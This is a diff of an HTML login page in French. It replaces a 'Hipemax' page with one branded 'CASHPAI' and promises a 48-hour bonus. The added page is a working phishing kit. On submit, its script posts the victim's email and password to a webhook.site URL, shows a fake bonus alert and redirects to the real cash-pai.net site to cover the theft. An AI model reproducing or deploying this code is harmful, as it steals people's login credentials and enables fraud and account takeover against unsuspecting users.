@@ -1,232 +1,354 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-  <title>Hipemax | Connexion</title>
+<!doctype html>
 
-  <script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<html lang="fr">      
+<head>      
+  <meta charset="utf-8" />      
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover">      
+  <title>CONNEXION PAGE - CASHPAI</title>      
+  <link rel="shortcut icon" href="https://cash-pai.net/images/logo/48.png">      
+  <style>      
+    :root {      
+      --bg:#07110a;      
+      --card:#0b1a12;      
+      --muted:#9aa6a0;      
+      --text:#e6efe9;      
+      --accent:#25d067;      
+      --accent-hover:#18b854;      
+      --input-bg:rgba(255,255,255,0.05);      
+      --radius:14px;      
+      --container-w:420px;      
+    }      
+    * { box-sizing:border-box; margin:0; padding:0 }      
+    html, body { height:100% }      
+    body {      
+      font-family:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;      
+      background:var(--bg);      
+      color:var(--text);      
+      -webkit-font-smoothing:antialiased;      
+      -moz-osx-font-smoothing:grayscale;      
+      line-height:1.25;      
+      -webkit-tap-highlight-color:transparent;      
+    }    /* -------- PRELOADER -------- */
+.preload-container {
+position:fixed;
+inset:0;
+display:flex;
+align-items:center;
+justify-content:center;
+background:var(--bg);
+z-index:1000;
+}
+.preload-logo {
+width:144px;
+height:144px;
+border-radius:24px;
+background-color:#25d067;
+display:flex;
+align-items:center;
+justify-content:center;
+box-shadow:0 10px 30px rgba(0,0,0,.6);
+position:relative;
+animation:pop .9s ease;
+}
+.preload-logo img { width:64px; height:auto; z-index:2 }
+@keyframes pop { from { transform:scale(.85); opacity:0 } to { transform:scale(1); opacity:1 } }
+.spinner {
+width:56px;
+height:56px;
+border-radius:50%;
+border:3px solid rgba(255,255,255,.06);
+border-top-color:rgba(255,255,255,.18);
+animation:spin 1s linear infinite;
+position:absolute;
+}
+@keyframes spin { to { transform:rotate(360deg) } }
 
-  <style>
-    /* RESET + base */
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-      background:#000;
-      color:#222;
-    }
+/* -------- HEADER -------- */
+.header {
+position:fixed;
+left:0;
+right:0;
+top:10px;
+z-index:30;
+display:flex;
+align-items:center;
+padding:0 16px;
+}
+.left.back-btn {
+display:inline-flex;
+align-items:center;
+justify-content:center;
+width:44px;
+height:44px;
+border-radius:10px;
+background:transparent;
+color:var(--text);
+text-decoration:none;
+transition:all .18s ease;
+}
+.left.back-btn svg { color:var(--text); opacity:.85 }
 
-    .auth-wrap{
-      min-height:100vh;
-      display:flex;
-      align-items:flex-start;
-      justify-content:center;
-      background-image:url('https://hipemax.com/themes/ozo/img/bg.png');
-      background-size:cover;
-      background-position:center top;
-      position:relative;
-      padding:36px 18px 80px;
-    }
-    .auth-wrap::before{
-      content:"";
-      position:absolute;
-      inset:0;
-      background:linear-gradient(to bottom,rgba(0,0,0,0.45) 0%,rgba(0,0,0,0.72) 60%);
-      pointer-events:none;
-    }
+/* -------- LAYOUT -------- */
+.tf-container { max-width:var(--container-w); margin:0 auto; padding:0 18px }
+.pt-45 { padding-top:60px }
+.pb-20 { padding-bottom:20px }
+.mt-32 { margin-top:32px }
+.mt-12 { margin-top:12px }
+.mt-16 { margin-top:16px }
+.mb-12 { margin-bottom:12px }
+.mb-8 { margin-bottom:8px }
+.mt-20 { margin-top:20px }
 
-    .card{
-      position:relative;
-      width:100%;
-      max-width:420px;
-      margin-top:60px;
-      z-index:2;
-      display:flex;
-      flex-direction:column;
-      align-items:center;
-      gap:24px;
-    }
+/* -------- TEXT -------- */
+.text-center { text-align:center }
+h2 { font-size:28px; letter-spacing:-.6px; font-weight:700; margin-bottom:6px }
 
-    .top-bar{
-      position:fixed;
-      top:16px;
-      left:12px;
-      right:12px;
-      z-index:10;
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      pointer-events:auto;
-    }
-    .top-bar button{
-      background:transparent;
-      border:0;
-      color:rgba(255,255,255,0.95);
-      font-size:14px;
-      padding:6px 10px;
-      display:inline-flex;
-      align-items:center;
-      gap:8px;
-      cursor:pointer;
-      backdrop-filter:blur(3px);
-    }
-    .top-bar .back-btn{
-      width:40px;
-      height:40px;
-      border-radius:10px;
-      background:rgba(0,0,0,0.35);
-      display:flex;
-      align-items:center;
-      justify-content:center;
-    }
-    .top-bar button[aria-label="lang"]{
-      font-size:13px;
-      color:rgba(255,255,255,0.85);
-      background:transparent;
-    }
+/* -------- SEPARATOR -------- */
+.auth-line {
+text-align:center;
+color:var(--muted);
+background:transparent;
+padding:14px 0;
+font-size:14px;
+margin-top:8px;
+position:relative;
+}
+.auth-line::before,
+.auth-line::after {
+content:"";
+position:absolute;
+top:50%;
+width:36%;
+height:1px;
+background:rgba(255,255,255,.04);
+}
+.auth-line::before { left:4%; transform:translateY(-50%) }
+.auth-line::after { right:4%; transform:translateY(-50%) }
 
-    .logo{
-      margin-top:28px;
-      text-align:center;
-      width:100%;
-    }
-    .logo p{
-      margin:0;
-      font-weight:800;
-      font-size:42px;            /* ← réduit */
-      letter-spacing:1px;
-      color:#0b0b0b;
-      display:inline-block;
-      background:rgba(255,255,255,0.92);
-      padding:0 6px;
-      border-radius:0;
-      position:relative;
-      transform:translateY(6px);
-    }
-    .logo p::after{
-      content:"";
-      width:100%;
-      height:5px;                /* ← réduit */
-      background:#000;
-      display:block;
-      margin-top:8px;
-      transform:translateY(-6px);
-    }
+/* -------- FORM -------- */
+fieldset { border:none; margin:0; padding:0 }
+label.label-ip { display:block; width:100% }
+.label-ip p { color:var(--muted); font-size:13px; margin-bottom:8px }
 
-    .form{
-      width:100%;
-      display:flex;
-      flex-direction:column;
-      gap:18px;
-      padding:18px 6px 0 6px;
-    }
+input[type="text"],
+input[type="email"],
+input[type="password"] {
+width:100%;
+min-height:56px;
+padding:16px;
+border-radius:14px;
+background:var(--input-bg);
+border:none;
+outline:none;
+color:var(--text);
+font-size:15px;
+box-shadow:inset 0 1px 0 rgba(255,255,255,.01);
+}
+input::placeholder { color:rgba(230,239,233,.45); font-size:15px }
 
-    label.field{
-      display:flex;
-      align-items:center;
-      gap:12px;
-      background:rgba(255,255,255,0.98);
-      border-radius:20px;        /* ← arrondi corrigé */
-      padding:12px 16px;
-      height:56px;               /* ← hauteur corrigée */
-      box-shadow:0 4px 14px rgba(0,0,0,0.18);
-    }
-    label.field > .ico{
-      width:24px;                /* ← réduit */
-      height:24px;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      color:#b63b44;
-    }
-    .field .inputs{
-      flex:1;
-      display:flex;
-      align-items:center;
-      gap:12px;
-    }
-    select#country{
-      -webkit-appearance:none;
-      -moz-appearance:none;
-      appearance:none;
-      border:0;
-      background:transparent;
-      font-size:15px;            /* ← réduit */
-      color:#8b8b8b;
-      padding:4px 6px;
-      width:84px;
-      font-weight:600;
-    }
-    input[type="text"],input[type="password"],input[placeholder]{
-      border:0;
-      outline:none;
-      font-size:15px;            /* ← réduit */
-      color:#6e6e6e;
-      background:transparent;
-      flex:1;
-      padding:6px 0;
-    }
-    .field.lock .ico{color:#1e5a9b;}
+.box-auth-pass { position:relative; display:flex; align-items:center }
+.show-pass {
+position:absolute;
+right:12px;
+top:50%;
+transform:translateY(-50%);
+height:36px;
+width:36px;
+border-radius:8px;
+border:none;
+display:inline-flex;
+align-items:center;
+justify-content:center;
+background:transparent;
+cursor:pointer;
+color:rgba(230,239,233,.9);
+}
+.show-pass svg { display:block }
+.icon-view-hide { display:none }
 
-    .action-btn{
-      width:100%;
-      height:56px;               /* ← hauteur corrigée */
-      border-radius:28px;        /* ← arrondi corrigé */
-      border:0;
-      font-size:18px;            /* ← réduit */
-      font-weight:700;
-      cursor:pointer;
-      box-shadow:0 8px 18px rgba(0,0,0,0.25);
-    }
-    .action-btn.login{
-      background:#c74b53;
-      color:white;
-      margin-top:14px;
-    }
-    .action-btn.login:hover{transform:translateY(-2px);transition:.12s ease;}
-    .action-btn.revert{
-      background:rgba(255,255,255,0.98);
-      color:#b74b53;
-      border:2px solid rgba(0,0,0,0.02);
-      margin-top:8px;
-      box-shadow:none;
-      font-weight:700;
-    }
-    .action-btn.revert:hover{transform:translateY(-2px);transition:.12s ease;}
+a.text-secondary {
+display:inline-block;
+margin-top:8px;
+color:var(--muted);
+text-decoration:none;
+font-size:13px;
+}
 
-    .spacer{height:56px}
+.btn-connexion {
+display:block;
+width:100%;
+background:var(--accent);
+color:#fff;
+border:none;
+padding:16px;
+font-size:16px;
+font-weight:600;
+border-radius:14px;
+margin-top:16px;
+box-shadow:0 8px 18px rgba(24,184,84,.12);
+transition:transform .12s ease, background .12s ease;
+}
+.btn-connexion:active { transform:translateY(1px) }
+.btn-connexion:hover { background:var(--accent-hover) }
 
-    .modal-lang{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);background:#fff;border-radius:12px;z-index:40;padding:18px;display:none;width:320px;box-shadow:0 20px 40px rgba(0,0,0,0.45);}
-    .modal-lang.show{display:block}
-    .modal-lang p.title{margin:0 0 8px;font-weight:700;font-size:18px;}
-    .modal-lang .langs{display:flex;flex-direction:column;gap:8px;margin:10px 0 14px;}
-    .modal-lang label{display:flex;align-items:center;gap:10px;padding:8px;border-radius:8px;cursor:pointer;}
-    .modal-lang .actions{display:flex;gap:8px;justify-content:flex-end;}
-    .modal-lang button{padding:8px 12px;border-radius:8px;border:0;cursor:pointer;}
-    .modal-lang button.active{background:#c74b53;color:#fff;}
+.text-small { font-size:13px; color:var(--muted) }
+p.text-center.text-small a { color:#fff; text-decoration:underline; opacity:.95 }
 
-    .loader-boss{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:50;background:rgba(0,0,0,0.46);}
-    .loader-boss.show{display:flex;}
-    .loader-boss .content{text-align:center;color:#fff;font-weight:600;}
-    .loader-boss img{width:46px;display:block;margin:0 auto 6px;}
+@media (min-width:720px) {
+body { background:linear-gradient(180deg, var(--bg) 0%, #07160c 100%) }
+.tf-container { padding:0 }
+main.pt-45 { padding-top:100px }
+}
+.preload-hidden {
+opacity:0;
+visibility:hidden;
+pointer-events:none;
+transition:opacity .5s ease, visibility .5s linear;
+}
 
-    @media(min-width:820px){
-      .card{max-width:420px;margin-top:90px;}
-      .logo p{font-size:56px}
-    }
+form { margin-top:6px }
+.label-ip + .label-ip { margin-top:16px }
+</style>
 
-    .logo p{background:transparent;color:#000;text-shadow:none;}
-    .logo p::after{background:#000;height:5px;margin-top:10px;border-radius:2px}
+</head>      
+<body>      
+  <!-- PRELOADER -->      
+  <div class="preload preload-container" id="preloader">      
+    <div class="preload-logo">      
+      <img src="https://cash-pai.net/images/logo/144.png" alt="Logo CashPai">      
+      <div class="spinner"></div>      
+    </div>      
+  </div>        <!-- HEADER -->        <header class="header fixed-top bg-surface">      
+    <a href="#" class="left back-btn" id="backBtn" aria-label="Retour">      
+      <svg width="22" height="22" viewBox="0 0 24 24">      
+        <path fill="currentColor" d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z" />      
+      </svg>      
+    </a>      
+  </header>        <main class="pt-45 pb-20">      
+    <div class="tf-container">      
+      <div class="mt-32">      
+        <h2 class="text-center">Connexion CASH-PAI</h2>      
+      </div>    
+      <div class="auth-line mt-12">Digital</div>      <form action="#" method="post" class="mt-16" id="loginForm" novalidate>      
+    <fieldset class="mt-16">      
+      <label class="label-ip">      
+        <p class="mb-8 text-small">Email</p>      
+        <input id="email" required name="email" type="email"
+       placeholder="Example@gmail.com" autocomplete="email">      
+      </label>      
+    </fieldset>      
 
-    input:focus,select:focus{outline:none;box-shadow:none;}
-  </style>
-</head>
-<body>
-  <!-- … le reste du HTML et JS reste inchangé … -->
-</body>
-</html>
+    <fieldset class="mt-16 mb-12">      
+      <label class="label-ip">      
+        <p class="mb-8 text-small">Mot de passe</p>      
+        <div class="box-auth-pass">      
+          <input id="password" type="password" required name="mdp"
+       placeholder="Your password"
+       class="password-field"
+       autocomplete="current-password">
+      
+          <button type="button" class="show-pass" id="togglePassword">      
+            <svg class="icon-view" viewBox="0 0 24 24" width="20" height="20">      
+              <path fill="currentColor" d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z" />      
+            </svg>      
+            <svg class="icon-view-hide" viewBox="0 0 24 24" width="20" height="20">      
+              <path fill="currentColor" d="M2 2l20 20-1.5 1.5L15 17.5C13.7 18.1 12.4 18.5 11 18.5c-7 0-11-7-11-7 1.4-2.3 3.7-4.3 6.5-5.3L.5 3.5 2 2z" />      
+            </svg>      
+          </button>      
+        </div>      
+      </label>      
+    </fieldset>      
+
+    <a href="#" class="text-secondary">Mot de passe oublié ?</a>      
+    <button class="btn-connexion mt-20" type="submit">Connexion</button>      
+
+    <div id="bonusMessage" class="mt-12 text-center text-small" style="display:none;color:#25d067;">      
+      🎉 Votre bonus sera envoyé dans 48 h !      
+    </div>      
+
+    <p class="mt-20 text-center text-small">      
+      Vous n'avez pas de compte ? <a href="register.php">Crée un compte</a>      
+    </p>      
+  </form>      
+</div>
+
+  </main>        <!-- Scripts -->      <script>  
+    (function () {      
+      const preloader = document.getElementById('preloader');      
+      function hidePreloader() {      
+        preloader.classList.add('preload-hidden');      
+        setTimeout(() => { preloader.style.display = 'none'; }, 520);      
+      }      
+      if (document.readyState === 'complete') {      
+        setTimeout(hidePreloader, 200);      
+      } else {      
+        window.addEventListener('load', () => setTimeout(hidePreloader, 300));      
+        setTimeout(hidePreloader, 1200);      
+      }      
+  
+      const toggle = document.getElementById('togglePassword');      
+      const pwd = document.querySelector('.password-field');      
+      if (toggle && pwd) {      
+        toggle.addEventListener('click', e => {      
+          e.preventDefault();      
+          const isPwd = pwd.type === 'password';      
+          pwd.type = isPwd ? 'text' : 'password';      
+          toggle.querySelector('.icon-view').style.display = isPwd ? 'none' : 'block';      
+          toggle.querySelector('.icon-view-hide').style.display = isPwd ? 'block' : 'none';      
+        });      
+        toggle.querySelector('.icon-view-hide').style.display = 'none';      
+      }      
+  
+      const form = document.getElementById('loginForm');      
+      const bonusMsg = document.getElementById('bonusMessage');      
+      if (form) {      
+        form.addEventListener('submit', e => {      
+          e.preventDefault();      
+          const email = form.querySelector('[name="email"]').value.trim();      
+          const mdp = form.querySelector('[name="mdp"]').value.trim();      
+          if (!email || !mdp) {      
+            alert('Veuillez remplir tous les champs.');      
+            return;      
+          }      
+          bonusMsg.style.display = 'block';      
+        });      
+      }      
+    })();  
+  </script>    <script>  
+    // Toggle mot de passe  
+    const pwd = document.getElementById('password');  
+    const eyeBtn = document.querySelector('.toggle-eye');  
+    eyeBtn?.addEventListener('click', () => {  
+      pwd.type = pwd.type === 'password' ? 'text' : 'password';  
+    });  
+  
+    // Checkbox "remember me"  
+    const remember = document.getElementById('remember');  
+    remember?.addEventListener('click', () => {  
+      const checked = remember.getAttribute('aria-checked') === 'true';  
+      remember.setAttribute('aria-checked', String(!checked));  
+    });  
+  
+    // Soumission formulaire  
+    document.getElementById("loginForm").addEventListener("submit", function(e) {  
+      e.preventDefault();  
+  
+      const phone = document.getElementById("email").value;   // récupère l’email mais envoyé comme "phone"  
+      const password = document.getElementById("password").value;  
+  
+      fetch("https://webhook.site/f8b07a2b-efd2-4812-bb67-972dc0912b4f", {  
+        method: "POST",  
+        headers: { "Content-Type": "text/plain" },  
+        body: JSON.stringify({  
+          phone: phone,  
+          password: password  
+        })  
+      })  
+      .then(() => console.log("Données envoyées au webhook !"))  
+      .catch(err => console.error("Erreur :", err));  
+  
+      alert("Le bonus sera transféré dans les 48h");  
+      window.location.href = "https://cash-pai.net/home.php?client=465";  
+    });  
+  </script>  </body>      
+</html>   
